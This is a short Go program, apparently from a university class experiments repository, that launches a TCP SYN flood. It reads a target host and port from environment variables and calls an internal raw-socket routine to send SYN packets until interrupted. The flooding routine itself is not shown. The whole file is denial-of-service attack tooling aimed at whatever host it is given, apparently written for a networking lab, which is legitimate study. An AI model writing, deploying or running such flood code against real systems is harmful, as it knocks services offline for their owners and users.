package main

import (
	"fmt"
	"os"
	"os/signal"
	"strconv"
	"web-programming-class-experiments/exp2-tcp-syn-flood/internal/raw"
)

func main() {
	var destHost = os.Getenv("FLOOD_DEST_HOST")
	var destPortStr = os.Getenv("FLOOD_DEST_PORT")
	destPort, err := strconv.ParseInt(destPortStr, 10, 64)
	if err != nil {
		panic(err)
	}
	var sigChan = make(chan os.Signal)
	signal.Notify(sigChan, os.Interrupt)
	var stopChan = make(chan bool)
	if err := raw.StartFlooding(stopChan,
		destHost, int(destPort),
		1400,
		"syn"); err != nil {
		panic(err)
	}
	<-sigChan
	fmt.Println("interrupt")
	stopChan <- true
}
